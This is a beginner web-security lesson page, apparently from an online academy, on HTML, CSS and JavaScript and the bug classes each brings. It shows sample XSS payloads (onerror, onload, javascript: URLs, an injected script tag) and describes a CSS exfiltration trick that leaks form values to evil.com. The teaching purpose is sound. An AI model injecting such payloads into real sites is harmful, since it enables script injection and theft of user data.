@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTML, CSS &amp; JavaScript — Path 05 · KashSec Academy</title>
+<meta name="description" content="The three languages every browser speaks. You don't need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.">
+<link rel="canonical" href="https://kashsec.vercel.app/#/lesson/05-web-basics/html-css-js">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="HTML, CSS &amp; JavaScript — Path 05 · KashSec Academy">
+<meta property="og:description" content="The three languages every browser speaks. You don't need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://kashsec.vercel.app/#/lesson/05-web-basics/html-css-js">
+<meta property="og:image" content="https://kashsec.vercel.app/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="HTML, CSS &amp; JavaScript — Path 05 · KashSec Academy">
+<meta name="twitter:description" content="The three languages every browser speaks. You don't need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.">
+<meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
+<meta name="theme-color" content="#0A0E13">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"LearningResource","name":"HTML, CSS & JavaScript — Path 05 · KashSec Academy","description":"The three languages every browser speaks. You don't need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.","url":"https://kashsec.vercel.app/#/lesson/05-web-basics/html-css-js","provider":{"@type":"Organization","name":"KashSec Academy","url":"https://kashsec.vercel.app"},"isAccessibleForFree":true,"learningResourceType":"Lesson"}
+</script>
+<style>
+:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
+main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
+.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
+.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
+.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
+.crumb a{color:var(--teal);text-decoration:none}
+h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
+h1{font-size:2rem;margin:.5rem 0 1rem}
+h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
+a{color:var(--teal)}
+code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
+pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
+pre code{background:transparent;color:var(--text);padding:0}
+blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
+table{width:100%;border-collapse:collapse;margin:1rem 0}
+th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
+th{background:var(--surface)}
+img{max-width:100%;height:auto}
+footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<main>
+  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="https://kashsec.vercel.app/#/lesson/05-web-basics/html-css-js">continue here →</a></div>
+  <div class="crumb"><a href="/">KashSec Academy</a> · <a href="/">Path 05 — How the Web Works</a> · HTML, CSS &amp; JavaScript</div>
+  <article><h1>HTML, CSS &amp; JavaScript</h1>
+<p>The three languages every browser speaks. You don&#39;t need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.</p>
+<h2>The three-way split</h2>
+<ul>
+<li><strong>HTML</strong> — the <strong>structure</strong>. Headings, paragraphs, links, forms. The &quot;bones&quot; of the page.</li>
+<li><strong>CSS</strong> — the <strong>style</strong>. Colours, fonts, spacing, animation. The &quot;skin.&quot;</li>
+<li><strong>JavaScript</strong> — the <strong>behaviour</strong>. Reacting to clicks, changing content, making requests. The &quot;muscle.&quot;</li>
+</ul>
+<p>Every web page is a mixture of these three, and each brings its own vulnerabilities.</p>
+<h2>HTML in 60 seconds</h2>
+<p>HTML uses <strong>tags</strong> in angle brackets to describe structure:</p>
+<pre><code class="language-html">&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Welcome&lt;/h1&gt;
+  &lt;p&gt;This is a &lt;a href=&quot;/next&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+  &lt;img src=&quot;/logo.png&quot; alt=&quot;Logo&quot;&gt;
+  &lt;form action=&quot;/login&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;text&quot;     name=&quot;username&quot;&gt;
+    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
+    &lt;button type=&quot;submit&quot;&gt;Log in&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Tags come in pairs (<code>&lt;p&gt;...&lt;/p&gt;</code>) or are self-closing (<code>&lt;img /&gt;</code>). Attributes carry properties (<code>href</code>, <code>src</code>, <code>name</code>). The whole document forms a tree called the <strong>DOM</strong> (Document Object Model), which JavaScript can read and modify.</p>
+<p>Tags you&#39;ll meet constantly:</p>
+<table>
+<thead>
+<tr>
+<th>Tag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;a&gt;</code></td>
+<td>Link</td>
+</tr>
+<tr>
+<td><code>&lt;img&gt;</code></td>
+<td>Image</td>
+</tr>
+<tr>
+<td><code>&lt;form&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td>
+<td>User input</td>
+</tr>
+<tr>
+<td><code>&lt;div&gt;</code>, <code>&lt;span&gt;</code></td>
+<td>Generic containers</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;</code></td>
+<td>JavaScript</td>
+</tr>
+<tr>
+<td><code>&lt;iframe&gt;</code></td>
+<td>Embed another page</td>
+</tr>
+</tbody></table>
+<h2>CSS in 60 seconds</h2>
+<p>CSS says how HTML should look:</p>
+<pre><code class="language-css">/* Every h1 is amber and bold */
+h1 {
+  color: #EFA43A;
+  font-weight: 700;
+}
+
+/* Elements with class=&quot;btn&quot; get styled */
+.btn {
+  padding: 10px 20px;
+  background: teal;
+  color: white;
+  border-radius: 6px;
+}
+
+/* Element with id=&quot;hero&quot; */
+#hero {
+  text-align: center;
+}
+</code></pre>
+<p>You select elements by tag name (<code>h1</code>), class (<code>.btn</code>), or id (<code>#hero</code>), and give them properties.</p>
+<p>CSS is mostly a defence-side concern in security, but it has its own attack angles: <strong>CSS injection</strong> can steal data character-by-character, and CSS can be used in some <strong>clickjacking</strong> and <strong>UI-redress</strong> attacks.</p>
+<h2>JavaScript in 60 seconds</h2>
+<p>JavaScript makes pages interactive. It runs <em>in your browser</em> on any page you visit — which is exactly why it&#39;s so dangerous when attacker-controlled.</p>
+<pre><code class="language-html">&lt;button id=&quot;hello&quot;&gt;Say hi&lt;/button&gt;
+&lt;script&gt;
+  const btn = document.getElementById(&quot;hello&quot;);
+  btn.addEventListener(&quot;click&quot;, () =&gt; {
+    alert(&quot;Hello from JavaScript!&quot;);
+  });
+&lt;/script&gt;
+</code></pre>
+<p>Modern JS can:</p>
+<ul>
+<li>Read and change any part of the DOM.</li>
+<li>Read and set <strong>cookies</strong> (unless <code>HttpOnly</code> is set).</li>
+<li>Make network requests to any URL (subject to CORS rules).</li>
+<li>Store data locally (<code>localStorage</code>, <code>sessionStorage</code>).</li>
+<li>Manipulate URLs, animate, run video, encrypt, etc.</li>
+</ul>
+<p><strong>Every one of those powers is a potential attack vector</strong> if attacker-controlled JavaScript ends up running on your page.</p>
+<h2>Inline JavaScript — the many places code can hide</h2>
+<p>The <code>&lt;script&gt;</code> tag isn&#39;t the only place JavaScript lives. HTML has a long list of <strong>event handler attributes</strong> that also run JavaScript directly:</p>
+<pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;
+&lt;body onload=&quot;alert(1)&quot;&gt;
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;
+&lt;svg onload=&quot;alert(1)&quot;&gt;
+</code></pre>
+<p>This matters enormously for security: a filter that only strips <code>&lt;script&gt;</code> tags but forgets <code>onerror</code>, <code>onload</code>, or <code>javascript:</code> URLs is trivially bypassed. This is exactly why real-world XSS filter bypass lists (which you&#39;ll use directly in Path 11 and Path 15) are so long — there are dozens of HTML attributes and contexts that can execute code, not just one. Recognising <em>all</em> the places JavaScript can hide in HTML, not just the obvious <code>&lt;script&gt;</code> tag, is a genuinely important skill for both finding and defending against XSS.</p>
+<h2>CSS selectors and specificity — a quick primer</h2>
+<p>Beyond the tag/class/id selectors above, CSS has combinators that target elements based on their relationship to others:</p>
+<pre><code class="language-css">/* Direct child */
+nav &gt; a { color: teal; }
+
+/* Any descendant */
+.sidebar a { font-size: 14px; }
+
+/* Attribute selector — every input whose type is &quot;password&quot; */
+input[type=&quot;password&quot;] { border: 2px solid red; }
+</code></pre>
+<p>That last pattern — selecting by attribute — is what powers <strong>CSS-based data exfiltration</strong> attacks: a malicious stylesheet can use attribute selectors like <code>input[value^=&quot;a&quot;]</code> combined with <code>background: url(https://evil.com/log?char=a)</code> to leak a form&#39;s value one character at a time, purely through CSS, with no JavaScript involved at all. It&#39;s a genuinely surprising attack for people who assume CSS is &quot;just styling&quot; and therefore safe.</p>
+<h2>The security shape of each language</h2>
+<p>Here&#39;s the crucial map, worth pinning to memory:</p>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Where it lives</th>
+<th>Signature bug class</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HTML</strong></td>
+<td>The DOM</td>
+<td><strong>XSS</strong> (Cross-Site Scripting)</td>
+</tr>
+<tr>
+<td><strong>CSS</strong></td>
+<td>Style rules</td>
+<td>CSS injection, clickjacking</td>
+</tr>
+<tr>
+<td><strong>JavaScript</strong></td>
+<td>Browser JS engine</td>
+<td><strong>XSS</strong>, DOM clobbering, prototype pollution, supply-chain</td>
+</tr>
+<tr>
+<td><strong>HTML forms</strong></td>
+<td>User input</td>
+<td><strong>CSRF</strong>, form spoofing, hidden-field manipulation</td>
+</tr>
+</tbody></table>
+<h2>Where user input becomes dangerous</h2>
+<p>Take this HTML template on a shopping site:</p>
+<pre><code class="language-html">&lt;h1&gt;Search results for: [USER INPUT]&lt;/h1&gt;
+</code></pre>
+<p>If the site inserts the user&#39;s search term straight into the HTML without escaping, and the user searches for:</p>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>...the browser will <em>execute</em> that script as if the site itself wrote it. That&#39;s <strong>reflected XSS</strong> — one of the classic web bugs, and it lives in the boundary between user input and HTML rendering.</p>
+<p>Path 11 has an entire lesson on XSS. For now, remember the shape: <strong>untrusted input → HTML context → executed as code</strong>.</p>
+<h2>JSON — the modern glue</h2>
+<p>Most modern web apps don&#39;t render entire HTML pages any more. Instead they load a JavaScript &quot;app&quot; once, then quietly fetch data as <strong>JSON</strong> as you use the site:</p>
+<pre><code class="language-json">{
+  &quot;user&quot;: &quot;alice&quot;,
+  &quot;id&quot;: 1,
+  &quot;roles&quot;: [&quot;admin&quot;, &quot;editor&quot;]
+}
+</code></pre>
+<p>You&#39;ll see JSON everywhere in Path 11 (APIs) and Path 15 (bug bounty). If you can read JSON, you can read most modern APIs.</p>
+<h2>Browser security foundations (glossary)</h2>
+<p>Terms you&#39;ll meet again and again:</p>
+<ul>
+<li><strong>Same-Origin Policy (SOP)</strong> — by default, JavaScript from <code>siteA.com</code> can&#39;t read data from <code>siteB.com</code>. This is the browser&#39;s most important security rule.</li>
+<li><strong>CORS (Cross-Origin Resource Sharing)</strong> — the mechanism that lets sites <em>selectively</em> opt in to cross-origin sharing. Misconfigured CORS is a common bug class.</li>
+<li><strong>CSP (Content Security Policy)</strong> — an HTTP header restricting <em>where</em> the page can load scripts, images, styles from. A strong XSS defence.</li>
+<li><strong>Cookies</strong> — small values the browser stores per site (next lesson).</li>
+<li><strong>HTTP-only, Secure, SameSite</strong> — cookie flags that harden them.</li>
+</ul>
+<h2>🧪 Lab — Break into the DOM</h2>
+<ol>
+<li>Open any page (say, <a href="https://example.com">example.com</a>) in Firefox in Kali.</li>
+<li>Press <strong>F12</strong> → <strong>Console</strong>.</li>
+<li>Type:</li>
+</ol>
+<pre><code class="language-javascript">document.title = &quot;Hacked (locally)&quot;;
+document.body.style.background = &quot;#EFA43A&quot;;
+document.querySelectorAll(&quot;a&quot;).forEach(a =&gt; a.textContent = &quot;🐉&quot;);
+</code></pre>
+<p>Press Enter after each line. Watch the page change <em>right now</em>, in your own browser.</p>
+<p>This is the exact power an XSS attacker gets on <em>someone else&#39;s</em> browser. Path 11 covers how attackers <em>land</em> code on a page — this lab is only what the code can do <em>once</em> there.</p>
+<p>Which browser security rule stops JavaScript on <code>evil.com</code> from reading data on <code>bank.com</code> by default?</p>
+<details><summary>Show answer</summary>The <strong>Same-Origin Policy (SOP)</strong>.</details><h2>Key terms</h2>
+<ul>
+<li><strong>HTML / CSS / JS</strong> — structure / style / behaviour.</li>
+<li><strong>DOM</strong> — the tree representation of an HTML document.</li>
+<li><strong>XSS</strong> — untrusted input executed as code in the page.</li>
+<li><strong>JSON</strong> — the modern data format between browser and server.</li>
+<li><strong>SOP / CORS / CSP</strong> — the browser&#39;s core security mechanisms.</li>
+</ul>
+<h2>Recap</h2>
+<ul>
+<li>HTML structures pages, CSS styles them, JavaScript adds behaviour.</li>
+<li>Each language brings distinct bug classes; XSS lives at the HTML/JS boundary.</li>
+<li>Modern apps use JSON APIs behind a single-page front-end.</li>
+<li>SOP, CORS, and CSP are the browser&#39;s security backbone.</li>
+</ul>
+<h3>References</h3>
+<ul>
+<li><a href="https://developer.mozilla.org/">MDN Web Docs</a> — the definitive reference for HTML, CSS, JS.</li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-Origin Policy explained — MDN</a></li>
+<li><a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator by Google</a> — paste a site&#39;s CSP, get a security review.</li>
+</ul>
+<p><strong>Next up →</strong> <a href="#/lesson/05-web-basics/client-vs-server">Client vs server</a></p>
+</article>
+  <footer>© KashSec Academy · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+</main>
+<script>
+// Redirect actual users into the SPA. Search-engine crawlers get to read
+// the content above before the redirect fires.
+(function(){
+  try {
+    var target = "https://kashsec.vercel.app/#/lesson/05-web-basics/html-css-js";
+    // Only redirect from the .html file, not from the SPA route itself.
+    if (location.pathname.endsWith('.html')) location.replace(target);
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
